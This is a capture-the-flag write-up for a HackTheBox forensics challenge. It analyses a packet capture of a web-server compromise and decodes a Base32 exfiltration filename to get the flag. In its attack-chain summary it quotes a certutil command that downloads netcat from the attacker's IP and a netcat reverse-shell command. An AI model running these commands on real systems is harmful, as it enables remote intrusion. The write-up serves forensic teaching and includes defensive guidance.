## Overview

`Chase` is an Easy HackTheBox **Forensics** challenge. You get one artifact — `chase.pcapng`,
a 216-packet capture of a web-server compromise — and nothing else (no live target). The whole
chain is in plain HTTP: an ASPX webshell, a `certutil` download of netcat, a reverse shell on
TCP/4444, and finally a data-exfil request. The twist is that the exfiltrated file's *body* is a
decoy; the flag is encoded in the *filename*.

## The technique

When you carve files out of a capture by reflex, you read their **contents**. This challenge
hides the secret in the **request URI** instead. The exfil GET is for a file named
`JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt` — a long, all-uppercase token over the `[A-Z2-7]`
alphabet with a throwaway `.txt` extension. That alphabet is the tell for **Base32**: decode the
name and the flag falls out. The actual file body is the harmless string `Hey there!`.

The wider story in the capture is a textbook Windows web intrusion, useful context for reading
the packets:

1. **Recon** — `GET /`, `GET /welcome.png`.
2. **Webshell upload** — `GET /upload.aspx`, then `POST /upload.aspx?operation=upload`.
3. **Command webshell** — `POST /cmd.aspx` with `xpath=c:\windows\system32\cmd.exe` and an `xcmd` argument.
4. **Tool download (LOLBIN)** — the webshell runs
   `certutil -urlcache -split -f http://22.22.22.7/nc64.exe c:\users\public\nc.exe`.
5. **Reverse shell** — `c:\users\public\nc.exe 22.22.22.7 4444 -e cmd.exe`.
6. **Exfil** — the victim GETs the Base32-named `.txt` from the attacker.

## Solution

First, triage the capture — protocol breakdown plus the ordered HTTP request list immediately
surfaces the attack:

```bash
tshark -r chase.pcapng -q -z io,phs
tshark -r chase.pcapng -Y http.request -T fields -e frame.number -e ip.src -e http.request.method -e http.request.uri
```

The exfil request stands out: `GET /JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt`. The filename is
the Base32 token. Decoding it is the whole solve. The durable artifact pulls every requested URI,
matches the Base32 token, and decodes it:

Create `solve.py`:

```python
#!/usr/bin/env python3
import base64, re, subprocess, sys

pcap = sys.argv[1] if len(sys.argv) > 1 else "chase.pcapng"

uris = subprocess.run(
    ["tshark", "-r", pcap, "-Y", "http.request",
     "-T", "fields", "-e", "http.request.uri"],
    capture_output=True, text=True).stdout.split()

for uri in uris:
    name = uri.lstrip("/").rsplit(".", 1)[0]      # strip path + extension
    if re.fullmatch(r"[A-Z2-7]{16,}", name):       # Base32 alphabet tell
        flag = base64.b32decode(name).decode(errors="ignore").strip()
        if flag.startswith("HTB{"):
            print(f"{uri} -> {flag}")
            break
```

```bash
python3 solve.py chase.pcapng
# /JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt -> HTB{...}
```

The flag prints directly. (Value redacted — solve it live.)

## Why it worked

Analysts instinctively carve and read file **bodies** (`tshark --export-objects http`). Encoding
the secret into a **filename** — over the Base32 alphabet, with a benign `.txt` extension —
slips past that reflex while the body (`Hey there!`) sells the misdirection. This is an
information-exposure-through-metadata pattern ([CWE-548](https://cwe.mitre.org/data/definitions/548.html)-adjacent):
the sensitive value travels in a place defenders don't normally inspect.

## Fix / defense

- **Egress filtering and proxy logging.** Alert on `certutil -urlcache` / `-split` (almost never
  legitimate) and on outbound connections to raw IPs on odd ports like 4444.
- **AppLocker / WDAC.** Block dropped tools such as `nc.exe`, especially from world-writable
  paths like `c:\users\public`.
- **Webshell detection.** Monitor web roots for newly written `.aspx` files and for IIS worker
  processes spawning `cmd.exe`.
- **Inspect metadata, not just payloads.** DLP and egress monitoring should flag high-entropy,
  Base32/Base64-looking **filenames** in outbound requests — covert channels hide in metadata too.
